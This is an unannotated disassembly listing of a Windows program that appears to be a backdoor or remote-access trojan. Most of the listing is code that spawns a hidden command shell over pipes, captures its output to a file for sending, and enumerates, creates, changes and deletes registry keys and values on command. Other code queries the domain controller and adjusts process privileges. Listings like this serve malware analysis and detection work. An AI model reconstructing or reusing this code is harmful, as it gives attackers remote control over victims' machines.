sub     edi, ecx
lea     edx, [esp+264h+var_200]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
push    22h             ; Val
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
mov     esi, ds:strchr
lea     ecx, [esp+268h+var_200]
push    ecx             ; Str
call    esi ; strchr
add     esp, 8
test    eax, eax
jz      short loc_406BB1
inc     eax
push    22h             ; Val
push    eax             ; Str
call    esi ; strchr
add     esp, 8
test    eax, eax
jz      short loc_406BB1
lea     edx, [esp+264h+var_200]
push    5Ch             ; Ch
push    edx             ; Str
mov     byte ptr [eax], 0
call    ds:strrchr
add     esp, 8
test    eax, eax
jz      short loc_406BB1
cmp     byte ptr [eax-1], 3Ah
jnz     short loc_406BA5
mov     byte ptr [eax+1], 0
jmp     short loc_406BA8

loc_406BA5:
mov     byte ptr [eax], 0

loc_406BA8:
lea     eax, [esp+264h+var_1FF]
push    eax
call    [esp+268h+var_258]

loc_406BB1:
mov     ecx, 11h
xor     eax, eax
lea     edi, [esp+264h+StartupInfo]
lea     edx, [esp+264h+StartupInfo]
rep stosd
lea     ecx, [esp+264h+ProcessInformation]
mov     [esp+264h+StartupInfo.dwFlags], 1
push    ecx             ; lpProcessInformation
push    edx             ; lpStartupInfo
push    eax             ; lpCurrentDirectory
push    eax             ; lpEnvironment
push    eax             ; dwCreationFlags
push    eax             ; bInheritHandles
push    eax             ; lpThreadAttributes
push    eax             ; lpProcessAttributes
push    ebp             ; lpCommandLine
push    eax             ; lpApplicationName
mov     [esp+28Ch+StartupInfo.wShowWindow], ax
call    ds:CreateProcessA
pop     edi
pop     esi
pop     ebp
add     esp, 258h
retn
sub_406B00 endp

align 10h



sub_406BF0 proc near

BytesRead= dword ptr -0A5Ch
CommandLine= byte ptr -0A58h
var_A54= dword ptr -0A54h
var_A50= dword ptr -0A50h
var_A4C= dword ptr -0A4Ch
var_A48= dword ptr -0A48h
StartupInfo= _STARTUPINFOA ptr -0A44h
Dest= byte ptr -0A00h
Buffer= byte ptr -800h
arg_0= dword ptr  4

sub     esp, 0A5Ch
push    ebx
push    ebp
push    esi
push    edi
push    offset LibFileName ; "Kernel32.dll"
call    ds:LoadLibraryA
mov     edi, ds:GetProcAddress
mov     esi, eax
push    offset aTerminateproce ; "TerminateProcess"
push    esi             ; hModule
call    edi ; GetProcAddress
push    offset aCreatepipe ; "CreatePipe"
push    esi             ; hModule
mov     ebp, eax
call    edi ; GetProcAddress
push    offset byte_409F3C ; lpFileName
mov     esi, eax
call    ds:DeleteFileA
mov     eax, [esp+0A6Ch+arg_0]
mov     ebx, 1
cmp     [eax], bl
jnz     short loc_406C67
mov     dword_40ACF4, 0
mov     byte_40AA20, 45h
call    sub_405140
mov     eax, ProcessInformation
push    0
push    eax
call    ebp
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 0A5Ch
retn

loc_406C67:
push    eax
lea     ecx, [esp+0A70h+Dest]
xor     edi, edi
push    offset aS_2     ; "%s\r\n"
push    ecx             ; Dest
mov     [esp+0A78h+BytesRead], edi
call    ds:sprintf
mov     eax, dword_40ACF4
add     esp, 0Ch
cmp     eax, edi
jnz     loc_406E56
lea     edx, [esp+0A6Ch+var_A50]
push    edi
push    edx
push    offset dword_40A058
push    offset hFile
mov     [esp+0A7Ch+var_A50], 0Ch
mov     [esp+0A7Ch+var_A4C], edi
mov     [esp+0A7Ch+var_A48], ebx
call    esi
lea     eax, [esp+0A6Ch+var_A50]
push    edi
push    eax
push    offset dword_40A050
push    offset dword_40A054
call    esi
mov     ecx, 11h
xor     eax, eax
lea     edi, [esp+0A6Ch+StartupInfo]
mov     edx, dword_409DF4
rep stosd
mov     ecx, dword_40A054
mov     eax, dword_40A058
mov     [esp+0A6Ch+StartupInfo.hStdInput], ecx
lea     ecx, [esp+0A6Ch+StartupInfo]
xor     esi, esi
push    offset ProcessInformation ; lpProcessInformation
push    ecx             ; lpStartupInfo
push    esi             ; lpCurrentDirectory
push    esi             ; lpEnvironment
push    esi             ; dwCreationFlags
mov     dword ptr [esp+0A80h+CommandLine], edx
push    ebx             ; bInheritHandles
mov     [esp+0A84h+StartupInfo.hStdError], eax
mov     [esp+0A84h+StartupInfo.hStdOutput], eax
mov     eax, dword_409DF8
push    esi             ; lpThreadAttributes
lea     edx, [esp+0A88h+CommandLine]
push    esi             ; lpProcessAttributes
push    edx             ; lpCommandLine
mov     [esp+0A90h+var_A54], eax
push    esi             ; lpApplicationName
mov     [esp+0A94h+StartupInfo.dwFlags], 101h
mov     [esp+0A94h+StartupInfo.wShowWindow], si
mov     [esp+0A94h+CommandLine], 63h
mov     byte ptr [esp+0A94h+var_A54], 65h
call    ds:CreateProcessA
test    eax, eax
jnz     short loc_406D55
mov     dword_40ACF4, esi
mov     byte_40AA20, 45h
call    sub_405140
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 0A5Ch
retn

loc_406D55:
mov     dword_40ACF4, ebx

loc_406D5B:
mov     ebx, ds:Sleep
push    1F4h            ; dwMilliseconds
call    ebx ; Sleep
mov     ebp, ds:PeekNamedPipe
xor     edi, edi
mov     esi, 1D4C0h

loc_406D75:
mov     eax, dword_40A074
test    eax, eax
jnz     loc_406E4B
mov     eax, hFile
push    0               ; lpBytesLeftThisMessage
lea     ecx, [esp+0A70h+BytesRead]
push    0               ; lpTotalBytesAvail
push    ecx             ; lpBytesRead
lea     edx, [esp+0A78h+Buffer]
push    800h            ; nBufferSize
push    edx             ; lpBuffer
push    eax             ; hNamedPipe
call    ebp ; PeekNamedPipe
test    eax, eax
jz      short loc_406E1B
mov     eax, [esp+0A6Ch+BytesRead]
test    eax, eax
jz      short loc_406E03
lea     ecx, [esp+0A6Ch+BytesRead]
push    0               ; lpOverlapped
push    ecx             ; lpNumberOfBytesRead
push    eax             ; nNumberOfBytesToRead
mov     eax, hFile
lea     edx, [esp+0A78h+Buffer]
push    edx             ; lpBuffer
push    eax             ; hFile
call    ds:ReadFile
test    eax, eax
jz      short loc_406E1B
mov     eax, [esp+0A6Ch+BytesRead]
add     edi, eax
cmp     edi, 1F4000h
jg      short loc_406E1B
lea     ecx, [esp+0A6Ch+Buffer]
mov     [esp+eax+0A6Ch+Buffer], 0
push    ecx             ; Str
call    sub_406EF0
lea     edx, [esp+0A70h+Buffer]
push    edx
call    sub_406EB0
add     esp, 8
test    eax, eax
jnz     short loc_406E1B

loc_406E03:             ; dwMilliseconds
push    64h
call    ebx ; Sleep
cmp     esi, 0FFFFFFFFh
jz      loc_406D75
sub     esi, 64h
test    esi, esi
jg      loc_406D75

loc_406E1B:
mov     esi, dword_40A088
push    offset byte_409F3C ; lpFileName
push    0               ; Offset
mov     dword_40A088, 54h
call    sub_405830
add     esp, 8
mov     dword_40A088, esi
push    offset byte_409F3C ; lpFileName
call    ds:DeleteFileA

loc_406E4B:
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 0A5Ch
retn

loc_406E56:
lea     eax, [esp+0A6Ch+BytesRead]
push    edi             ; lpOverlapped
push    eax             ; lpNumberOfBytesWritten
lea     edi, [esp+0A74h+Dest]
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
mov     edx, dword_40A050
not     ecx
dec     ecx
push    ecx             ; nNumberOfBytesToWrite
lea     ecx, [esp+0A78h+Dest]
push    ecx             ; lpBuffer
push    edx             ; hFile
call    ds:WriteFile
test    eax, eax
jnz     loc_406D5B
push    eax
mov     eax, ProcessInformation
push    eax
call    ebp
mov     dword_40ACF4, 0
mov     byte_40AA20, 45h
call    sub_405140
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 0A5Ch
retn
sub_406BF0 endp

align 10h



sub_406EB0 proc near

arg_0= dword ptr  4

mov     edx, [esp+arg_0]
push    edi
mov     edi, edx
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
mov     al, 3Eh
cmp     [ecx+edx-1], al
jnz     short loc_406ED0
pop     edi
mov     eax, 1
retn

loc_406ED0:
cmp     ecx, 2
jl      short loc_406EE2
cmp     [ecx+edx-2], al
jnz     short loc_406EE2
pop     edi
mov     eax, 1
retn

loc_406EE2:
pop     edi
xor     eax, eax
retn
sub_406EB0 endp

align 10h



; int __cdecl sub_406EF0(void *Str)
sub_406EF0 proc near

Str= dword ptr  4

push    esi
push    edi
push    offset aAb_0    ; "ab+"
push    offset byte_409F3C ; Filename
call    ds:fopen
mov     edx, [esp+10h+Str]
mov     esi, eax
mov     edi, edx
or      ecx, 0FFFFFFFFh
xor     eax, eax
push    esi             ; File
repne scasb
not     ecx
dec     ecx
push    1               ; Count
push    ecx             ; Size
push    edx             ; Str
call    ds:fwrite
push    esi             ; File
call    ds:fclose
add     esp, 1Ch
pop     edi
pop     esi
retn
sub_406EF0 endp

align 10h



sub_406F30 proc near

var_4= dword ptr -4

push    ecx
push    esi
push    edi
push    3E800h          ; Size
mov     esi, 5
call    ds:malloc
mov     edi, eax
add     esp, 4
test    edi, edi
jz      short loc_406F8E
lea     eax, [edi+5]
mov     byte ptr [edi], 61h
push    eax             ; int
mov     eax, lpPathName
mov     edx, [eax]
lea     ecx, [eax+4]
push    ecx             ; lpSubKey
push    edx             ; hKey
call    sub_4070E0
lea     esi, [eax+5]
mov     [esp+18h+var_4], eax
mov     byte ptr [edi+esi], 1
inc     esi
lea     eax, [edi+esi]
push    eax             ; cchValueName
mov     eax, lpPathName
mov     edx, [eax]
lea     ecx, [eax+4]
push    ecx             ; lpSubKey
push    edx             ; hKey
call    sub_407160
add     esp, 18h
mov     [esp+0Ch+var_4], eax
add     esi, eax

loc_406F8E:
lea     ecx, [esp+0Ch+var_4]
lea     eax, [edi+5]
push    ecx
lea     edx, [esi-5]
push    eax
push    edx
push    eax
mov     [edi+1], esi
call    sub_4037B0
push    esi
push    edi
call    sub_402980
push    edi             ; Memory
call    ds:free
add     esp, 1Ch
pop     edi
pop     esi
pop     ecx
retn
sub_406F30 endp

align 10h



sub_406FC0 proc near
push    esi
mov     esi, lpPathName
push    edi
or      ecx, 0FFFFFFFFh
lea     edx, [esi+4]
xor     eax, eax
mov     edi, edx
repne scasb
not     ecx
dec     ecx
lea     eax, [ecx+edx+1]
push    eax             ; LPCSTR
mov     eax, [esi]
push    edx             ; lpSubKey
push    eax             ; hKey
call    sub_407300
add     esp, 0Ch
neg     eax
sbb     al, al
and     al, 0Ah
add     al, 45h
mov     byte_40AA20, al
call    sub_405140
pop     edi
pop     esi
retn
sub_406FC0 endp

align 10h



sub_407000 proc near
push    ebx
mov     ebx, lpPathName
push    esi
push    edi
lea     edx, [ebx+4]
or      ecx, 0FFFFFFFFh
mov     edi, edx
xor     eax, eax
repne scasb
not     ecx
dec     ecx
lea     esi, [ecx+edx+1]
or      ecx, 0FFFFFFFFh
mov     edi, esi
repne scasb
not     ecx
dec     ecx
lea     eax, [ecx+esi+1]
mov     ecx, [ecx+esi+5]
push    ecx             ; cbData
lea     ecx, [eax+8]
mov     eax, [eax]
push    ecx             ; lpData
mov     ecx, [ebx]
push    eax             ; dwType
push    esi             ; lpValueName
push    edx             ; lpSubKey
push    ecx             ; hKey
call    sub_4072A0
add     esp, 18h
neg     eax
sbb     al, al
and     al, 0Ah
add     al, 45h
mov     byte_40AA20, al
call    sub_405140
pop     edi
pop     esi
pop     ebx
retn
sub_407000 endp

align 10h



sub_407060 proc near
push    esi
mov     esi, lpPathName
push    edi
or      ecx, 0FFFFFFFFh
lea     edx, [esi+4]
xor     eax, eax
mov     edi, edx
repne scasb
not     ecx
dec     ecx
lea     eax, [ecx+edx+1]
push    eax             ; pszSubKey
mov     eax, [esi]
push    edx             ; lpSubKey
push    eax             ; hKey
call    sub_407200
add     esp, 0Ch
neg     eax
sbb     al, al
and     al, 0Ah
add     al, 45h
mov     byte_40AA20, al
call    sub_405140
pop     edi
pop     esi
retn
sub_407060 endp

align 10h



sub_4070A0 proc near
push    esi
mov     esi, lpPathName
push    edi
or      ecx, 0FFFFFFFFh
lea     edx, [esi+4]
xor     eax, eax
mov     edi, edx
repne scasb
not     ecx
dec     ecx
lea     eax, [ecx+edx+1]
push    eax             ; lpValueName
mov     eax, [esi]
push    edx             ; lpSubKey
push    eax             ; hKey
call    sub_407250
add     esp, 0Ch
neg     eax
sbb     al, al
and     al, 0Ah
add     al, 45h
mov     byte_40AA20, al
call    sub_405140
pop     edi
pop     esi
retn
sub_4070A0 endp

align 10h



; int __cdecl sub_4070E0(HKEY hKey, LPCSTR lpSubKey, int)
sub_4070E0 proc near

hKey= dword ptr  4
lpSubKey= dword ptr  8
arg_8= dword ptr  0Ch

mov     ecx, [esp+lpSubKey]
mov     edx, [esp+hKey]
push    ebx
lea     eax, [esp+4+lpSubKey]
push    esi
xor     esi, esi
push    eax             ; phkResult
push    0F003Fh         ; samDesired
push    esi             ; ulOptions
push    ecx             ; lpSubKey
push    edx             ; hKey
xor     ebx, ebx
call    ds:RegOpenKeyExA
test    eax, eax
jz      short loc_40710A
pop     esi
xor     eax, eax
pop     ebx
retn

loc_40710A:
push    ebp
mov     ebp, [esp+0Ch+arg_8]
push    edi

loc_407110:
mov     ecx, [esp+10h+lpSubKey]
push    0               ; lpftLastWriteTime
push    0               ; lpcchClass
push    0               ; lpClass
lea     eax, [esp+1Ch+hKey]
lea     edi, [esi+ebp]
push    0               ; lpReserved
push    eax             ; lpcchName
push    edi             ; lpName
push    ebx             ; dwIndex
push    ecx             ; hKey
mov     [esp+30h+hKey], 104h
call    ds:RegEnumKeyExA
test    eax, eax
jnz     short loc_407148
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
inc     ebx
lea     esi, [esi+ecx+1]
jmp     short loc_407110

loc_407148:
mov     edx, [esp+10h+lpSubKey]
push    edx             ; hKey
call    ds:RegCloseKey
pop     edi
mov     eax, esi
pop     ebp
pop     esi
pop     ebx
retn
sub_4070E0 endp

align 10h



; int __cdecl sub_407160(HKEY hKey, LPCSTR lpSubKey, DWORD cchValueName)
sub_407160 proc near

hKey= dword ptr  4
lpSubKey= dword ptr  8
cchValueName= dword ptr  0Ch

mov     ecx, [esp+lpSubKey]
mov     edx, [esp+hKey]
push    ebx
lea     eax, [esp+4+hKey]
push    esi
xor     esi, esi
push    eax             ; phkResult
push    0F003Fh         ; samDesired
push    esi             ; ulOptions
push    ecx             ; lpSubKey
push    edx             ; hKey
xor     ebx, ebx
call    ds:RegOpenKeyExA
test    eax, eax
jz      short loc_40718A
pop     esi
xor     eax, eax
pop     ebx
retn

loc_40718A:
push    ebp
mov     ebp, ds:RegEnumValueA
push    edi
mov     edi, [esp+10h+cchValueName]

loc_407196:
lea     eax, [esp+10h+lpSubKey]
lea     ecx, [edi+esi+108h]
push    eax             ; lpcbData
lea     edx, [edi+esi+100h]
push    ecx             ; lpData
push    edx             ; lpType
mov     edx, [esp+1Ch+hKey]
lea     eax, [esp+1Ch+cchValueName]
push    0               ; lpReserved
lea     ecx, [esi+edi]
push    eax             ; lpcchValueName
push    ecx             ; lpValueName
push    ebx             ; dwIndex
push    edx             ; hKey
mov     [esp+30h+cchValueName], 100h
mov     [esp+30h+lpSubKey], 2800h
call    ebp ; RegEnumValueA
test    eax, eax
jnz     short loc_4071EB
mov     eax, [esp+10h+lpSubKey]
inc     ebx
mov     [esi+edi+104h], eax
mov     ecx, [esp+10h+lpSubKey]
lea     esi, [esi+ecx+108h]
jmp     short loc_407196

loc_4071EB:
mov     edx, [esp+10h+hKey]
push    edx             ; hKey
call    ds:RegCloseKey
pop     edi
mov     eax, esi
pop     ebp
pop     esi
pop     ebx
retn
sub_407160 endp

align 10h



; int __cdecl sub_407200(HKEY hKey, LPCSTR lpSubKey, LPCSTR pszSubKey)
sub_407200 proc near

hKey= dword ptr  4
lpSubKey= dword ptr  8
pszSubKey= dword ptr  0Ch

mov     ecx, [esp+lpSubKey]
mov     edx, [esp+hKey]
lea     eax, [esp+lpSubKey]
push    eax             ; phkResult
push    0F003Fh         ; samDesired
push    0               ; ulOptions
push    ecx             ; lpSubKey
push    edx             ; hKey
call    ds:RegOpenKeyExA
test    eax, eax
jz      short loc_407223
xor     eax, eax
retn

loc_407223:
mov     eax, [esp+pszSubKey]
mov     ecx, [esp+lpSubKey]
push    esi
push    eax             ; pszSubKey
push    ecx             ; hkey
call    ds:SHDeleteKeyA
mov     edx, [esp+4+lpSubKey]
mov     esi, eax
push    edx             ; hKey
call    ds:RegCloseKey
xor     eax, eax
test    esi, esi
setz    al
pop     esi
retn
sub_407200 endp

align 10h



; int __cdecl sub_407250(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName)
sub_407250 proc near

hKey= dword ptr  4
lpSubKey= dword ptr  8
lpValueName= dword ptr  0Ch

mov     ecx, [esp+lpSubKey]
mov     edx, [esp+hKey]
lea     eax, [esp+lpSubKey]
push    eax             ; phkResult
push    0F003Fh         ; samDesired
push    0               ; ulOptions
push    ecx             ; lpSubKey
push    edx             ; hKey
call    ds:RegOpenKeyExA
test    eax, eax
jz      short loc_407273
xor     eax, eax
retn

loc_407273:
mov     eax, [esp+lpValueName]
mov     ecx, [esp+lpSubKey]
push    esi
push    eax             ; lpValueName
push    ecx             ; hKey
call    ds:RegDeleteValueA
mov     edx, [esp+4+lpSubKey]
mov     esi, eax
push    edx             ; hKey
call    ds:RegCloseKey
xor     eax, eax
test    esi, esi
setz    al
pop     esi
retn
sub_407250 endp

align 10h



; int __cdecl sub_4072A0(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, DWORD dwType, BYTE *lpData, DWORD cbData)
sub_4072A0 proc near

hKey= dword ptr  4
lpSubKey= dword ptr  8
lpValueName= dword ptr  0Ch
dwType= dword ptr  10h
lpData= dword ptr  14h
cbData= dword ptr  18h

mov     ecx, [esp+lpSubKey]
mov     edx, [esp+hKey]
lea     eax, [esp+lpSubKey]
push    eax             ; phkResult
push    0F003Fh         ; samDesired
push    0               ; ulOptions
push    ecx             ; lpSubKey
push    edx             ; hKey
call    ds:RegOpenKeyExA
test    eax, eax
jz      short loc_4072C3
xor     eax, eax
retn

loc_4072C3:
mov     eax, [esp+cbData]
mov     ecx, [esp+lpData]
mov     edx, [esp+dwType]
push    esi
push    eax             ; cbData
mov     eax, [esp+8+lpValueName]
push    ecx             ; lpData
mov     ecx, [esp+0Ch+lpSubKey]
push    edx             ; dwType
push    0               ; Reserved
push    eax             ; lpValueName
push    ecx             ; hKey
call    ds:RegSetValueExA
mov     edx, [esp+4+lpSubKey]
mov     esi, eax
push    edx             ; hKey
call    ds:RegCloseKey
xor     eax, eax
test    esi, esi
setz    al
pop     esi
retn
sub_4072A0 endp

align 10h



; int __cdecl sub_407300(HKEY hKey, LPCSTR lpSubKey, LPCSTR)
sub_407300 proc near

hKey= dword ptr  4
lpSubKey= dword ptr  8
arg_8= dword ptr  0Ch

mov     ecx, [esp+lpSubKey]
mov     edx, [esp+hKey]
lea     eax, [esp+lpSubKey]
push    eax             ; phkResult
push    0F003Fh         ; samDesired
push    0               ; ulOptions
push    ecx             ; lpSubKey
push    edx             ; hKey
call    ds:RegOpenKeyExA
test    eax, eax
jz      short loc_407323
xor     eax, eax
retn

loc_407323:
mov     ecx, [esp+arg_8]
push    esi
mov     edx, [esp+4+lpSubKey]
push    edi
lea     eax, [esp+8+hKey]
push    0               ; lpdwDisposition
push    eax             ; phkResult
push    0               ; lpSecurityAttributes
push    0F003Fh         ; samDesired
push    0               ; dwOptions
push    0               ; lpClass
push    0               ; Reserved
push    ecx             ; lpSubKey
push    edx             ; hKey
call    ds:RegCreateKeyExA
mov     edi, ds:RegCloseKey
mov     esi, eax
mov     eax, [esp+8+lpSubKey]
push    eax             ; hKey
call    edi ; RegCloseKey
mov     ecx, [esp+8+hKey]
push    ecx             ; hKey
call    edi ; RegCloseKey
xor     eax, eax
pop     edi
test    esi, esi
setz    al
pop     esi
retn
sub_407300 endp

align 10h



sub_407370 proc near

bufptr= dword ptr -4

push    ecx
cmp     VersionInformation.dwPlatformId, 2
jnz     short loc_4073C3
lea     eax, [esp+4+bufptr]
mov     [esp+4+bufptr], 0
push    eax             ; bufptr
push    0               ; domainname
push    0               ; servername
call    NetGetDCName
test    eax, eax
jnz     short loc_4073AE
mov     ecx, [esp+4+bufptr]
push    ecx
push    offset aS_3     ; "%S"
push    offset Dest     ; Dest
call    ds:sprintf
add     esp, 0Ch
jmp     short loc_4073B5

loc_4073AE:
mov     Dest, 0

loc_4073B5:
mov     eax, [esp+4+bufptr]
test    eax, eax
jz      short loc_4073C3
push    eax             ; Buffer
call    NetApiBufferFree

loc_4073C3:
pop     ecx
retn
sub_407370 endp

align 10h
; [00000006 BYTES: COLLAPSED FUNCTION SetSecurityInfo. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION SetEntriesInAclA. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION WNetCloseEnum. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION NetApiBufferFree. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION NetGetDCName. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION __CxxFrameHandler. PRESS CTRL-NUMPAD+ TO EXPAND]
align 10h
; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS CTRL-NUMPAD+ TO EXPAND]


; Attributes: noreturn bp-based frame

public start
start proc near

Code= dword ptr -78h
var_74= dword ptr -74h
var_70= byte ptr -70h
var_6C= dword ptr -6Ch
var_68= dword ptr -68h
var_64= byte ptr -64h
var_60= byte ptr -60h
StartupInfo= _STARTUPINFOA ptr -5Ch
ms_exc= CPPEH_RECORD ptr -18h

push    ebp
mov     ebp, esp
push    0FFFFFFFFh
push    offset stru_408218
push    offset _except_handler3
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
sub     esp, 68h
push    ebx
push    esi
push    edi
mov     [ebp+ms_exc.old_esp], esp
xor     ebx, ebx
mov     [ebp+ms_exc.registration.TryLevel], ebx
push    2
call    ds:__set_app_type
pop     ecx
or      dword_40AD10, 0FFFFFFFFh
or      dword_40AD14, 0FFFFFFFFh
call    ds:__p__fmode
mov     ecx, dword_40AD0C
mov     [eax], ecx
call    ds:__p__commode
mov     ecx, dword_40AD08
mov     [eax], ecx
mov     eax, ds:_adjust_fdiv
mov     eax, [eax]
mov     dword_40AD18, eax
call    nullsub_2
cmp     dword_409E20, ebx
jnz     short loc_4074B2
push    offset sub_4075AC
call    ds:__setusermatherr
pop     ecx

loc_4074B2:
call    sub_40759A
push    offset unk_40900C
push    offset unk_409008
call    _initterm
mov     eax, dword_40AD04
mov     [ebp+var_6C], eax
lea     eax, [ebp+var_6C]
push    eax
push    dword_40AD00
lea     eax, [ebp+var_64]
push    eax
lea     eax, [ebp+var_70]
push    eax
lea     eax, [ebp+var_60]
push    eax
call    ds:__getmainargs
push    offset unk_409004
push    offset unk_409000
call    _initterm
add     esp, 24h
mov     eax, ds:_acmdln
mov     esi, [eax]
mov     [ebp+var_74], esi
cmp     byte ptr [esi], 22h
jnz     short loc_407545

loc_40750B:
inc     esi
mov     [ebp+var_74], esi
mov     al, [esi]
cmp     al, bl
jz      short loc_407519
cmp     al, 22h
jnz     short loc_40750B

loc_407519:
cmp     byte ptr [esi], 22h
jnz     short loc_407522

loc_40751E:
inc     esi
mov     [ebp+var_74], esi

loc_407522:
mov     al, [esi]
cmp     al, bl
jz      short loc_40752C
cmp     al, 20h
jbe     short loc_40751E

loc_40752C:
mov     [ebp+StartupInfo.dwFlags], ebx
lea     eax, [ebp+StartupInfo]
push    eax             ; lpStartupInfo
call    ds:GetStartupInfoA
test    byte ptr [ebp+StartupInfo.dwFlags], 1
jz      short loc_407550
movzx   eax, [ebp+StartupInfo.wShowWindow]
jmp     short loc_407553

loc_407545:
cmp     byte ptr [esi], 20h
jbe     short loc_407522
inc     esi
mov     [ebp+var_74], esi
jmp     short loc_407545

loc_407550:
push    0Ah
pop     eax

loc_407553:
push    eax
push    esi
push    ebx
push    ebx             ; lpModuleName
call    ds:GetModuleHandleA
push    eax
call    sub_401000
mov     [ebp+var_68], eax
push    eax             ; Code
call    ds:exit

loc_40756D:
mov     eax, [ebp+ms_exc.exc_ptr]
mov     ecx, [eax]
mov     ecx, [ecx]
mov     [ebp+Code], ecx
push    eax
push    ecx
call    _XcptFilter
pop     ecx
pop     ecx
retn

loc_407581:
mov     esp, [ebp+ms_exc.old_esp]
push    [ebp+Code]      ; Code
call    ds:_exit
start endp

align 2
; [00000006 BYTES: COLLAPSED FUNCTION _XcptFilter. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _initterm. PRESS CTRL-NUMPAD+ TO EXPAND]



sub_40759A proc near
push    30000h          ; Mask
push    10000h          ; NewValue
call    _controlfp
pop     ecx
pop     ecx
retn
sub_40759A endp




sub_4075AC proc near
xor     eax, eax
retn
sub_4075AC endp

; [00000001 BYTES: COLLAPSED FUNCTION nullsub_2. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _except_handler3. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _controlfp. PRESS CTRL-NUMPAD+ TO EXPAND]
align 10h
; [00000006 BYTES: COLLAPSED FUNCTION Process32Next. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION Process32First. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION CreateToolhelp32Snapshot. PRESS CTRL-NUMPAD+ TO EXPAND]
align 10h



SEH_401000 proc near
mov     eax, offset stru_408228
jmp     __CxxFrameHandler
SEH_401000 endp

align 1000h
_text ends

; Section 2. (virtual address 00008000)
; Virtual size                  : 00000C7E (   3198.)
; Section size in file          : 00001000 (   4096.)
; Offset to raw data for section: 00008000
; Flags 40000040: Data Readable
; Alignment     : default
;
; Imports from ADVAPI32.dll
;

; Segment type: Externs
; _idata
; LSTATUS __stdcall RegCloseKey(HKEY hKey)
extrn RegCloseKey:dword
; LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData)
extrn RegSetValueExA:dword
; LSTATUS __stdcall RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
extrn RegQueryValueExA:dword
; LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition)
extrn RegCreateKeyExA:dword
; LSTATUS __stdcall RegDeleteValueA(HKEY hKey, LPCSTR lpValueName)
extrn RegDeleteValueA:dword
; LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
extrn RegOpenKeyExA:dword
; DWORD __stdcall SetSecurityInfo(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl)
extrn __imp_SetSecurityInfo:dword
; DWORD __stdcall SetEntriesInAclA(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_A pListOfExplicitEntries, PACL OldAcl, PACL *NewAcl)
extrn __imp_SetEntriesInAclA:dword
; BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength)
extrn AdjustTokenPrivileges:dword
; BOOL __stdcall LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid)
extrn LookupPrivilegeValueA:dword
; BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength)
extrn GetTokenInformation:dword
; BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle)
extrn OpenProcessToken:dword
; BOOL __stdcall GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer)
extrn GetUserNameA:dword
; BOOL __stdcall LookupAccountSidA(LPCSTR lpSystemName, PSID Sid, LPSTR Name, LPDWORD cchName, LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse)
extrn LookupAccountSidA:dword
; LSTATUS __stdcall RegEnumKeyExA(HKEY hKey, DWORD dwIndex, LPSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime)
extrn RegEnumKeyExA:dword
; LSTATUS __stdcall RegEnumValueA(HKEY hKey, DWORD dwIndex, LPSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
extrn RegEnumValueA:dword

;
; Imports from KERNEL32.dll
;
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo)
extrn GetStartupInfoA:dword
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
extrn GetModuleHandleA:dword
